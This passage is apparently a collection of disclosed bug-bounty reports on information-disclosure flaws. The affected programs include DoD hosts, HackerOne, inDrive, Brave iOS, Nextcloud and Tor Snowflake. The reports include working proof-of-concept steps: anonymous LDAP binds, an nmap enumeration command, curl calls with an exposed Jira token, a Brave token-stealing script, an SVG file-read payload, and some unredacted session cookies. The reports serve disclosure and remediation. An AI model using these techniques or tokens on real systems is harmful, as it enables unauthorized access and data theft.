    "Arn": "arn:aws:iam::██████:user/bc3-storage"
}
$ AWS_DEFAULT_REGION=us-east-2 AWS_ACCESS_KEY_ID=████████ AWS_SECRET_ACCESS_KEY=██████████ aws s3 ls s3://███/
                           PRE ███████/
                           PRE ████████/
                           PRE ███/
                           PRE ██████/
                           PRE █████████/
                           PRE ████/
                           PRE ███████/
                           PRE ███/
                           PRE ███/
                           PRE █████/
                           PRE █████/
                           PRE █████/
█████████ ████████ ███████
██████ ████████ ██████
██████ ████████ █████
██████████ ██████ ██████
███ █████████ ██████████
██████████ ███████ █████████
███ ███████ █████████
... snip ...
```

Another thing that I was able to extract is fragments of queries of other users, including cookies (that is a random example):

```
X_REAL_IP: █████
X_FORWARDED_FOR: ████████, ███
HOST: ████████
X_QUEUE_START: 1690786808.173
CONNECTION: close
COOKIE: █████
█████████%██████%2BVxMClK5d1rjoLKbCyFnKab9lI2lZ9sLvGW%2BT60xsygpl6syYIfVHK73km9DT98ecq0JD68OBnI9EdzLcEdmI5%2BXr%2FuOZ5BeUMoX--kvDVySR7oaYSGdHy--RU8uCFyrq8mPCjEvyX38OA%3D%3D; _csrf_token=KHczIU3KBHe%2FJjVhpFWn48FJ2vtYha4YdwUvXdypO51h5iLa4XvkjqaX0XYtzy7fOJahGGN40mfq8GMEN0v1t0SqEnfJUY%2F7CY1mVVSs9EuAFK8wF4Wrh5jA9jk4sen8KDEDXq7sjAMjdnsLLzIjL0LYLG8P8%2FsZz2BHy95JB9JTSsyPleUI--MLV2RZiAHIJrVXv%2F--rQLRhEgWWYGfXxRmqL%2B%2Frw%3D%3D; authenticity_token=████; color_scheme=none; bc3_session_verification_token=0187762ee195d9bdbb1c; bc3_identity_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBCSTBqYXdFPSIsImV4cCI6bnVsbCwicHVyIjoiY29va2llLmJjM19pZGVudGl0eV9pZCJ9fQ%3D%3D--957bc8a13ea3ae13b00792f0fecaa58f046a791b
ACCEPT: application/json
X_REQUESTED_WITH: XMLHttpRequest
ACCEPT_LANGUAGE: de-DE,de;q=0.9
IF_NONE_MATCH: W/"77ae6ae7dd96d1bac74baed254a6ab62"
USER_AGENT: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
REFERER: █████
X_FETCH_TYPE: native
X_CSRF_TOKEN: ██████████
X_FORWARDED_PROTO: https
X_FORWARDED_PORT: 443
```

Also, there were some fragments of Ruby code:

```
def owner_id_before_type_cast();self.attribute_before_type_cast("owner_id");end;def organization_before_type_cast();self.attribute_before_type_cast("organization");end;def about_url_before_type_cast();self.attribute_before_type_cast("about_url");end;def client_id_before_type_cast();self.attribute_before_type_cast("client_id");end;def client_secret_before_type_cast();self.attribute_before_type_cast("client_secret");end;def redirect_uri_before_type_cast();self.attribute_before_type_cast("redirect_uri");end;def trusted_before_type_cast();self.attribute_before_type_cast("trusted");end;def scope_before_type_cast();self.attribute_before_type_cast("scope");end;def signing_secret_before_type_cast();self.attribute_before_type_cast("signing_secret");
```

## Mitigation

1. As the first and the easiest hotfix, I suggest updating the librsvg to the latest version. That will fix this particular bug.
2. Another possible quick-fix option would be to forbid uploading SVG avatars or to skip preview generation for them. Note that the previews are not generated for the SVG files anywhere except the avatars (e.g., in the "Docs & Files" section); thus, exploiting librsvg issues is impossible using these endpoints.
3. As a long-term solution, I suggest moving image preview generation to an isolated environment. If you would convert every image in another process inside a networkless docker, that would eliminate all the class of image converter-related issues.

---

### [LDAP Anonymous Login enabled in ████](https://hackerone.com/reports/2081332)

- **Report ID:** `2081332`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @shuvam321
- **Bounty:** - usd
- **Disclosed:** 2023-09-08T17:16:54.754Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
The host ██████████ has anonymous LDAP login enabled, which means that anyone can connect to the LDAP server without providing any authentication credentials. This allows unauthorized users to perform LDAP queries, potentially retrieving sensitive information such as user details, organizational data, or other critical information stored in the LDAP directory.

## References
https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap

## Impact

Attackers can exploit this vulnerability to gain unauthorized access to the LDAP server and retrieve sensitive information stored within the directory. Attackers can use the gathered information to perform further attacks, including privilege escalation, or targeted attacks against the system or its users.

## System Host(s)
████

## Affected Product(s) and Version(s)
LADP

## CVE Numbers


## Steps to Reproduce
## Proof Hosts Belong to DoD

██████

1. First install ldap3 using pip3 and run the following command.

```
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import ldap3==
>>> server = ldap3.Server('██████████', get_info = ldap3.ALL, port =636, use_ssl = True)
>>> connection = ldap3.Connection(server)
>>> connection.bind()
True
>>> server.info
DSA info (from DSE):
  Supported LDAP versions: 2, 3
  Naming contexts: 
    dc=satx,dc=disa,dc=mil
    uid=Monitor
    cn=iasdsadmin
  Supported controls: 
    1.2.826.0.1.3344810.2.3 - Matched Values - Control - RFC3876
    1.2.840.113556.1.4.1413 - Permissive modify - Control - MICROSOFT
    1.2.840.113556.1.4.319 - LDAP Simple Paged Results - Control - RFC2696
    1.2.840.113556.1.4.473 - Sort Request - Control - RFC2891
    1.2.840.113556.1.4.805 - Tree delete - Control - MICROSOFT
    1.3.6.1.1.12 - Assertion - Control - RFC4528
    1.3.6.1.1.13.1 - LDAP Pre-read - Control - RFC4527
    1.3.6.1.1.13.2 - LDAP Post-read - Control - RFC4527
    1.3.6.1.4.1.26027.1.5.2 - Replication repair - Control - OpenDS
    1.3.6.1.4.1.26027.1.5.4
    1.3.6.1.4.1.36733.2.1.5.1
    1.3.6.1.4.1.36733.2.1.5.5
    1.3.6.1.4.1.42.2.27.8.5.1 - Password policy - Control - IETF DRAFT behera-ldap-password-policy
    1.3.6.1.4.1.42.2.27.9.5.2 - Get effective rights - Control - IETF DRAFT draft-ietf-ldapext-acl-model
    1.3.6.1.4.1.42.2.27.9.5.8 - Account usability - Control - SUN microsystems
    1.3.6.1.4.1.4203.1.10.1 - Subentries - Control - RFC3672
    1.3.6.1.4.1.4203.1.10.2 - No-Operation - Control - IETF DRAFT draft-zeilenga-ldap-noop
    1.3.6.1.4.1.4203.666.5.12
    1.3.6.1.4.1.7628.5.101.1 - LDAP subentries - Control - IETF DRAFT draft-ietf-ldup-subentry
    2.16.840.1.113730.3.4.12 - Proxied Authorization (old) - Control - Netscape
    2.16.840.1.113730.3.4.16 - Authorization Identity Request Control - Control - RFC3829
    2.16.840.1.113730.3.4.17 - Real attribute only request - Control - Netscape
    2.16.840.1.113730.3.4.18 - Proxy Authorization Control - Control - RFC6171
    2.16.840.1.113730.3.4.19 - Chaining loop detection - Control - Netscape
    2.16.840.1.113730.3.4.2 - ManageDsaIT - Control - RFC3296
    2.16.840.1.113730.3.4.3 - Persistent Search - Control - IETF
    2.16.840.1.113730.3.4.4 - Netscape Password Expired - Control - Netscape
    2.16.840.1.113730.3.4.5 - Netscape Password Expiring - Control - Netscape
    2.16.840.1.113730.3.4.9 - Virtual List View Request - Control - IETF
  Supported extensions: 
    1.3.6.1.1.8 - Cancel Operation - Extension - RFC3909
    1.3.6.1.4.1.1466.20037 - StartTLS - Extension - RFC4511-RFC4513
    1.3.6.1.4.1.26027.1.6.1 - Password policy state - Control - OpenDS
    1.3.6.1.4.1.26027.1.6.2 - Get connection ID - Control - OpenDS
    1.3.6.1.4.1.26027.1.6.3 - Get symmetric key - Control - OpenDS
    1.3.6.1.4.1.4203.1.11.1 - Modify Password - Extension - RFC3062
    1.3.6.1.4.1.4203.1.11.3 - Who am I - Extension - RFC4532
  Supported features: 
    1.3.6.1.1.14 - Modify-Increment - Feature - RFC4525
    1.3.6.1.4.1.4203.1.5.1 - All Op Attrs - Feature - RFC3673
    1.3.6.1.4.1.4203.1.5.2 - OC AD Lists - Feature - RFC4529
    1.3.6.1.4.1.4203.1.5.3 - True/False filters - Feature - RFC4526
  Supported SASL mechanisms: 
    SCRAM-SHA-512, PLAIN, EXTERNAL, SCRAM-SHA-256
  Schema entry: 
    cn=schema
Vendor name: ForgeRock AS.
Vendor version: ForgeRock Directory Services 7.3.0-20230323223207-47dd3dc1b26e0d8a982cad26d51b3a91ed1e9309
Other:
  objectClass: 
    top
    ds-root-dse
  alive: 
    true
  fullVendorVersion: 
    7.3.0.47dd3dc1b26e0d8a982cad26d51b3a91ed1e9309
  healthy: 
    true
  supportedAuthPasswordSchemes: 
    SCRAM-SHA-512
    PBKDF2-HMAC-SHA256
    SCRAM-SHA-256
    PBKDF2-HMAC-SHA512
  supportedTLSCiphers: 
    TLS_AES_128_GCM_SHA256
    TLS_AES_256_GCM_SHA384
    TLS_DHE_RSA_WITH_AES_128_GCM_SHA256
    TLS_DHE_RSA_WITH_AES_256_GCM_SHA384
    TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
    TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384
    TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
    TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
    TLS_EMPTY_RENEGOTIATION_INFO_SCSV
  supportedTLSProtocols: 
    TLSv1.2
    TLSv1.3
```


2. You will get information about the LDAP server, including supported LDAP versions, naming contexts, supported controls, supported extensions, supported features, supported SASL mechanisms, vendor information, and other details.

## Nmap Command to Enumerate the Information:

```
nmap -n -sV --script "ldap* and not brute" -p 389 ████████
```

█████

## Suggested Mitigation/Remediation Actions
Modify the LDAP server configuration to disable anonymous access and require authentication for all LDAP queries & configure proper access control .

---

### [IDOR in channel ID leads to customer email disclosure on https://video.ibm.com](https://hackerone.com/reports/2083270)

- **Report ID:** `2083270`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** IBM
- **Reporter:** @tusnj
- **Bounty:** - usd
- **Disclosed:** 2023-08-11T13:44:22.341Z
- **CVE(s):** -

**Summary (team):**

IDOR in channel ID led to email disclosure on https://video.ibm.com and was reported to IBM, analyzed and has been remediated. Thank you to our external researcher.

---

### [An attacker can can view any hacker email via  /SaveCollaboratorsMutation operation name ](https://hackerone.com/reports/2032716)

- **Report ID:** `2032716`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** HackerOne
- **Reporter:** @0xrayan1996
- **Bounty:** 12500 usd
- **Disclosed:** 2023-07-04T11:45:06.634Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**

An attacker can view any attacker or normal user email after send invitation via dummy report , disclose their private email.
 
**Description:**

### Steps To Reproduce

1 - Create a dummy report and send it
2 - Add a hacker that you want to disclose his email  , Max is only 2 invites per report
3 - send the invite after sending the invite the hacker will be pending status until accept the report .
4- Go the pen on the right for adding more collaborator and click on the pen and capture traffic , you will see the user email in first request,
even that the user not accept the invitation yet  

HTTP Request : 
```
POST /graphql HTTP/2
Host: hackerone.com

[sinp]

{"operationName":"SaveCollaboratorsMutation","variables":{"input":{"report_id":2032701,"collaborators":[{"username_or_email":"testmealways","bounty_weight":0.9989999999999999},{"username_or_email":"███████","bounty_weight":0.9989999999999999},{"username_or_email":"███████","bounty_weight":0.9989999999999999}]},"product_area":"collaboration","product_feature":"save_collaborators"},"query":"mutation SaveCollaboratorsMutation($input: SaveCollaboratorsMutationInput!) {\n  saveCollaborators(input: $input) {\n    was_successful\n    errors {\n      edges {\n        node {\n          message\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}

````

Example :

Here is email for todayisnew , Hacker 1 rank in H1 :

```
████████

```


Video PoC :

████████

## Impact

An attacker can view any user's email registered with Hackerone as hacker .

---

### [Full access to InDrive jira panel via exposed API token ](https://hackerone.com/reports/1785145)

- **Report ID:** `1785145`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** inDrive
- **Reporter:** @bogdantc
- **Bounty:** 1500 usd
- **Disclosed:** 2023-06-28T09:21:07.265Z
- **CVE(s):** -

**Vulnerability Information:**

**Description**

Hello!

Browsing through GitHub I found the following repository:

███


Looking for interesting keywords, the following file popped up:

███████


```
package ru.indriver.jira.api

object Constants {
    const val jiraHost = "https://indriver.atlassian.net"
    const val baseUrl = "$jiraHost/rest"
    const val token = "██████"

    ███
    // const val token = "██████=="
}
```


The repository wasn't updated in a while, but I still decided to give it a change and try to make an API call with the auth token:

curl -i -s -k -X $'GET' \
    -H $'Host: indriver.atlassian.net' -H $'Cache-Control: max-age=0' -H $'Authorization: Basic ████' -H $'Content-Type: application/json' -H $'Sec-Ch-Ua: \"Google Chrome\";v=\"107\", \"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'Sec-Ch-Ua-Platform: \"macOS\"' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Sec-Fetch-Site: none' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,de;q=0.7' \
    -b $'atlassian.xsrf.token=450f5681-becb-48d1-a8bc-efc045d75244_08e86700250ae917acc90fead0122eca3628f5a5_lout' \
    $'https://indriver.atlassian.net/rest/api/2/issue/67212'

Surprisingly, this was sucessfull and I was able to fetch a random issue ID, which normally I wouldn't have access to because you're instantly getting redirect to the atlassian OAuth flow if you're visiting https://indriver.atlassian.net/


**Steps to reproduce:**


1. Do the following cURL:
```
curl -i -s -k -X $'GET' \
    -H $'Host: indriver.atlassian.net' -H $'Cache-Control: max-age=0' -H $'Authorization: Basic ████████' -H $'Content-Type: application/json' -H $'Sec-Ch-Ua: \"Google Chrome\";v=\"107\", \"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'Sec-Ch-Ua-Platform: \"macOS\"' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Sec-Fetch-Site: none' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,de;q=0.7' \
    -b $'atlassian.xsrf.token=450f5681-becb-48d1-a8bc-efc045d75244_08e86700250ae917acc90fead0122eca3628f5a5_lout' \
    $'https://indriver.atlassian.net/rest/api/2/issue/67212'
```
Notice the response:

███████

We have full access to the InDrive Atlassian panel, ability to fetch sensitive information.

## Impact

Sensitive information disclosure - full access to the Atlassian panel - projects/issues/accounts etc.

**Summary (team):**

The token disclosure vulnerability was discovered, revealing the Jira API token being exposed in the company’s GitHub repository. Wrongdoers with the compromised API token could view the projects, tasks, comments, and other information stored in Jira.

---

### [Security token and handler name leak from window.braveBlockRequests](https://hackerone.com/reports/1668723)

- **Report ID:** `1668723`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Brave Software
- **Reporter:** @nishimunea
- **Bounty:** 700 usd
- **Disclosed:** 2023-06-22T05:51:03.326Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

Brave for iOS protects privileged JS to native bridges by using random JavaScript handler names and security tokens.
However, by altering [window.braveBlockRequests](https://github.com/brave/brave-ios/blob/08fb4b0ca43625d706b96158267f0b8da6f63250/Client/Frontend/UserContent/UserScripts/RequestBlocking.js#L6) property from scripts on the web page, these secret values can be stolen.

To be specific, `braveBlockRequests` property is set after the execution of the script on the page. Thus, by setting the malicious property as an immutable property from the page beforehand as shown below, it is possible to prevent overwriting by the legitimate property.
```
Object.defineProperty(window, "braveBlockRequests", {
    enumerable: false,
    configurable: false,
    writable: false,
    value: function(args) { window.args = args } // Steal handler name and token here
});
```

## Products affected: 

* Brave for iOS Version 1.41.1 (22.7.27.20) with the default settings

## Steps To Reproduce:

* Open https://csrf.jp/2022/brave_token_leak.php
* Push "Attack" button in the page
* Secret handler name and security token is shown on the page

## Supporting Material/References:

* Attached is a movie file that demonstrate the above steps to reproduce.

## Impact

The impact depends on which bridge is abused. As further features are implemented in the Brave, its potential risk tends to be increased.

---

### [Sensitive Data Exposure via wp-config.php file](https://hackerone.com/reports/1912671)

- **Report ID:** `1912671`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @0r10nh4ck
- **Bounty:** - usd
- **Disclosed:** 2023-05-15T15:04:32.303Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**

Hi team,
A copy of the WordPress config file wp-config.php has been found at  █████████ endpoint. It contains sensitive information, such as MySQL and AWS credentials, and various keys.

## References

https://codex.wordpress.org/WordPress_Files

## Impact

The page provides information to users who do not need it.

## System Host(s)
████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Go to: ███/wp-config.php_
2. See the information.

## Suggested Mitigation/Remediation Actions
Implement access control.

---

### [Moving private messages into vision with updateMessage method](https://hackerone.com/reports/1406479)

- **Report ID:** `1406479`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Rocket.Chat
- **Reporter:** @gronke
- **Bounty:** - usd
- **Disclosed:** 2023-05-09T19:39:50.318Z
- **CVE(s):** CVE-2023-28325

**Summary (team):**

A vulnerability has been discovered in the updateMessage Meteor Method, allowing adversaries to edit messages without proper authorization. This occurs due to insufficient permission checks for the "rid" parameter. Attackers can exploit this issue to leak private messages with known message IDs.

---

### [Snowflake server: Leak of TLS packets from other clients](https://hackerone.com/reports/1880610)

- **Report ID:** `1880610`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Tor
- **Reporter:** @hazae41
- **Bounty:** - usd
- **Disclosed:** 2023-03-15T07:29:09.416Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
This issue is related to the Snowflake pluggable transport server. 
It seems Snowflake clients receive "ghost" packets at the KCP layer, that encapsulate TLS packets unrelated to the current session.
Those TLS packets are from other clients, and contain handshake record, application data, or other TLS stuff.

## Steps To Reproduce:
Just run a Snowflake client and it will start receiving ghost packets.

## Setting up KCP logging:

1. Git clone the Snowflake client
2. Open VSCode or similar editor
3. In the `torrc` file,  setup logging with `ClientTransportPlugin snowflake exec ./client -log snowflake.log`
4. Open `./lib/snowflake.go`, search `kcp.NewConn2`, right click then `Go to definition`
5. Search `readLoop`, right click then `Go to definition`
6. Right click on `defaultReadLoop` then `Go to definition`
7. Now just under the line where it says `s.conn.ReadFrom(buf)`, add the line `log.Println("kcp <-", buf)`
8. Now start Tor with Snowflake using `tor -f ./torrc`
9. Open `./snowflake.log`

## Inspecting

Notice that the KCP layer receive bytes not starting with the regular KCP header:

{F2187164}

`X X X X 81 0 255 255 ...`

4 little-endian bytes for the conversation ID, then 81/82 for the command, then 0, then 255 255 (little-endian) for the window size.

This is an issue because KCP packets, just like TCP packets, are segments, and are never segmented themselves.

So, KCP doesn't recognize those ghost packets and discard them.

In `Input`

{F2187165}

In `kcpInput`, which calls `Input`

{F2187166}

They are completely discarded and never reach the upper layer, that's why this has never been noticed.

So, what are those packets? 

Some look like SMUX packets: 

{F2187167}
 
`2 2 L L S 0 0 0`

2 for the SMUX version, 2 for the psh command, 2 little-endian bytes for the length, and 4 little-endian bytes for the stream.

By the way, the stream ID is always set to 3, which is a proof that those packets are from other clients, as if you change the default SMUX stream ID to something else (in the SMUX code), you will still receive those packets from stream 3.

 Some other look like KCP packets, but the conversation ID is not the same as other KCP packets:

{F2187168}

If you Cmd+F these bytes, you will not find any other occurence, so you never had this conversation ID, which is another proof that those packets are from other clients, and not from a previous connection.

Those KCP packets also contains a SMUX packet:

{F2187169}

Now, the creepy part is that both those packets contain TLS packets:

{F2187171}

{F2187172}

{F2187173}

20/21/22/23 for the record type (handshake, application data, ...), then 3 3 (big-endian) for the TLS version (which is 1.2), then the TLS fragment (encrypted if type 23)

{F2187174}

Notice that in the following screenshot, we have a ghost packet containing TLS application data (23) before our normal packets containing TLS handshake data (22)

{F2187175}

This is another proof that the ghost packets are from another TLS connection, as it would be impossible to get TLS application data before handshake data (except if renegociation, which is not the case here as it's a fresh new connection)

## Conclusion

All this leads to the conclusion that the Snowflake server is leaking TLS packets to clients from other clients.

This would still need further investigation: 
- Why is this occuring?
- Is the Snowflake client leaking too?
- Can we exploit this? To deanonymize people?

While we don't know those answers, this issue must be considered with high severity.

## Impact

Even if it seems we can't modify those packets or exploit the TLS protocol, this issue still needs further investigation in order to show its real impact, as it could possibly deanonymize users.

---

### [Sensitive Data Exposure at https://█████████](https://hackerone.com/reports/1720278)

- **Report ID:** `1720278`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @0r10nh4ck
- **Bounty:** - usd
- **Disclosed:** 2023-02-24T18:58:25.839Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**

I found in the endpoint https://███/api/getEnvVars, 
sensitive data of environment variables containing: AWS S3 credentials, PATH, IP and PORTs.

## References

https://www.tenable.com/plugins/was/113164
https://docs.aws.amazon.com/general/latest/gr/aws-sec-cred-types.html
https://docs.aws.amazon.com/general/latest/gr/aws-access-keys-best-practices.html

## Impact

By using leaked AWS credentials or abusing credentials with misconfigured permissions, 
an attacker could try to gain access to sensitive information on the AWS account 
or perform arbitrary modification on the AWS resources.

## System Host(s)
████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Enable a HTTP interception proxy, such as Burp Suite or OWASP ZAP
2. Use a browser to navigate to: https://█████████
3. Find the HTTP POST to https://█████████/api/getEnvVars
4. See the response.

POC:

```json
{"PORT":"8080","PATH":"/home/vcap/app/node_modules/.bin:/home/vcap/node_modules/.bin:/home/node_modules/.bin:/node_modules/.bin:/home/vcap/deps/0/node/lib/node_modules/npm/node_modules/@npmcli/run-script/lib/node-gyp-bin:/home/vcap/deps/0/bin:/usr/local/bin:/usr/bin:/bin:/home/vcap/app/bin:/home/vcap/deps/0/node_modules/.bin","APP_SUB_DOMAIN":"██████","DEPLOY_ENV":"test","CF_INSTANCE_ADDR":"████████:61069","CF_INSTANCE_IP":"█████████","CF_INSTANCE_PORT":"61069","HOME":"/home/vcap/app","MEMORY_LIMIT":"125m","PWD":"/home/vcap/app","TMPDIR":"/home/vcap/tmp","USER":"vcap","VCAP_APP_HOST":"0.0.0.0","VCAP_APP_PORT":"8080","VCAP_APPLICATION":"{\"application_id\":\"█████████\",\"application_name\":\"████████\",\"application_uris\":[\"███\"],\"application_version\":\"███████\",\"cf_api\":\"https://api.system.██████\",\"host\":\"0.0.0.0\",\"instance_id\":\"█████████\",\"instance_index\":0,\"limits\":{\"disk\":3072,\"fds\":16384,\"mem\":125},\"name\":\"█████\",\"organization_id\":\"█████\",\"port\":8080,\"process_id\":\"███████\",\"process_type\":\"web\",\"space_id\":\"f28c5898-2473-4bf8-90e4-24d77a930603\",\"space_name\":\"CDN2-0_test\",\"uris\":[\"█████\"],\"version\":\"████\"}","VCAP_SERVICES":"{\"aws-s3\":[{\n  \"label\": \"aws-s3\",\n  \"provider\": null,\n  \"plan\": \"standard\",\n  \"name\": \"██████\",\n  \"tags\": [\n\n  ],\n  \"instance_guid\": \"█████████\",\n  \"instance_name\": \"█████\",\n  \"binding_guid\": \"██████████\",\n  \"binding_name\": null,\n  \"credentials\": {\n    \"access_key_id\": \"██████\",\n    \"bucket\": \"███-████████\",\n    \"region\": \"███\",\n    \"secret_access_key\": \"████\"\n  },\n  \"syslog_drain_url\": null,\n  \"volume_mounts\": [\n\n  ]\n},{\n  \"label\": \"aws-s3\",\n  \"provider\": null,\n  \"plan\": \"standard\",\n  \"name\": \"█████\",\n  \"tags\": [\n\n  ],\n  \"instance_guid\": \"█████████\",\n  \"instance_name\": \"███████\",\n  \"binding_guid\": \"██████████\",\n  \"binding_name\": null,\n  \"credentials\": {\n    \"access_key_id\": \"█████\",\n    \"bucket\": \"██████████-████\",\n    \"region\": \"██████████\",\n    \"secret_access_key\": \"████████\"\n  },\n  \"syslog_drain_url\": null,\n  \"volume_mounts\": [\n\n  ]\n}]}","s3_env_params":{"s3":{"config":{"credentials":{"expired":false,"expireTime":null,"refreshCallbacks":[],"accessKeyId":"████"},"credentialProvider":{"providers":[null,null,null,null,null,null,null],"resolveCallbacks":[]},"region":"████","logger":null,"apiVersions":{},"apiVersion":null,"endpoint":"https://s3.amazonaws.com","httpOptions":{"timeout":120000,"agent":null},"maxRedirects":10,"paramValidation":true,"sslEnabled":true,"s3ForcePathStyle":false,"s3BucketEndpoint":false,"s3DisableBodySigning":true,"s3UsEast1RegionalEndpoint":"legacy","computeChecksums":true,"convertResponseTypes":true,"correctClockSkew":false,"customUserAgent":null,"dynamoDbCrc32":true,"systemClockOffset":0,"signatureVersion":"v4","signatureCache":true,"retryDelayOptions":{},"useAccelerateEndpoint":false,"clientSideMonitoring":false,"endpointDiscoveryEnabled":false,"endpointCacheSize":1000,"hostPrefixEnabled":true,"stsRegionalEndpoints":"legacy","useFipsEndpoint":false,"useDualstackEndpoint":false},"endpoint":{"protocol":"https:","host":"s3.amazonaws.com","port":443,"hostname":"s3.amazonaws.com","pathname":"/","path":"/","href":"https://s3.amazonaws.com/"},"_events":{"apiCallAttempt":[null],"apiCall":[null]},"_clientId":10},"s3_bucket":"██████-███","user_url":"████"}}
```

## Suggested Mitigation/Remediation Actions
- Implement access control.
- Properly configure the API.
- Block requisition exposure.

---

### [Sensitive information disclosure [HtUS]](https://hackerone.com/reports/1632104)

- **Report ID:** `1632104`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @syarif07
- **Bounty:** - usd
- **Disclosed:** 2023-02-24T18:37:12.038Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hi Team :)
I found that the server status directory on your system is open, it displays server status and sensitive information by server

## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. visit: https://█████████/server-status/

## Supporting Material/References:
███

  * [attachment / reference]

## Impact

sensitive information is clearly displayed, that is, server status, attackers can find sensitive information from the server (server logs)

---

### [connect.8x8.com: Users with no permission can track/access restricted details/data via GET /api/v2/support/requests/<ticket number >HTTP/2](https://hackerone.com/reports/1499114)

- **Report ID:** `1499114`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** 8x8
- **Reporter:** @emperor
- **Bounty:** - usd
- **Disclosed:** 2023-02-15T08:00:57.576Z
- **CVE(s):** -

**Summary (team):**

@emperor reported to us an issue where information about our internal support agents were visible via `/api/v2/support/requests/<ticket number>`.
Our team put additional Access Control checks in place, which resolved the issue.

---

### [Critical sensitive information Disclosure. [HtUS]](https://hackerone.com/reports/1626236)

- **Report ID:** `1626236`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @berserkbd47
- **Bounty:** 500 usd
- **Disclosed:** 2023-01-13T18:05:48.810Z
- **CVE(s):** -

**Vulnerability Information:**

(Database user,Database password,Database name) 
on https://██████.edu/

I got sensitive information:
view-source:https://██████████.edu/database.php.orig


Database information (Database user,Database password,Database name)
$hostname     = '████████.edu';
$db         = '█████████';
$username     = '████_user';
$password     = '████';

## Impact

Bug impact:
Sensitive information disclosed and possible for an attacker can access into the system.

---

### [HEIC image preview can be used to invoke Imagick](https://hackerone.com/reports/1261413)

- **Report ID:** `1261413`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** Nextcloud
- **Reporter:** @lukasreschkenc
- **Bounty:** - usd
- **Disclosed:** 2023-01-07T09:55:38.085Z
- **CVE(s):** CVE-2021-32802

**Vulnerability Information:**

The HEIC image preview provider calls into Imagick at https://github.com/nextcloud/server/blob/5d097ddb4b99673f57b8c085dedd93880ee2539d/lib/private/Preview/HEIC.php#L98-L109. This is bad as Imagick processes all kind of image types.

One can use this for example to exfiltrate arbitrary files by passing a SVG file that contains a `xlink:href` to a locally existing file. There are also other concerns with regard to SSRF and XML parsing done by Imagick.

A super naive example, uploading a file such as "test.heic" with this content will render the file "nextcloud20.png" inside it. (but you can also reference PDFs, or use it for SSRF, etc etc.

`test.heic`:
```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   xmlns:xlink="http://www.w3.org/1999/xlink"
   style="overflow: hidden; position: relative;"
   width="500"
   height="500">
    <image x="0" y="0" width="500" height="500" xlink:href="/Users/lukasreschke/Downloads/nextcloud20.png" stroke-width="1" id="image3204" />
</svg>
```

Preview:

{F1376376}

## Impact

Gaining access to arbitrary files on the system, SSRF, etc.

---

### [Wordpress users Disclosure [ /wp-json/wp/v2/users/ ]  Not Resolved () ](https://hackerone.com/reports/1784999)

- **Report ID:** `1784999`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** MTN Group
- **Reporter:** @thewikiii
- **Bounty:** - usd
- **Disclosed:** 2022-12-28T14:10:19.124Z
- **CVE(s):** -

**Vulnerability Information:**

On this report's #735586  You closed the report and changed the status to Resolved.
But it's Not Resolved The Bug  It's Still there 

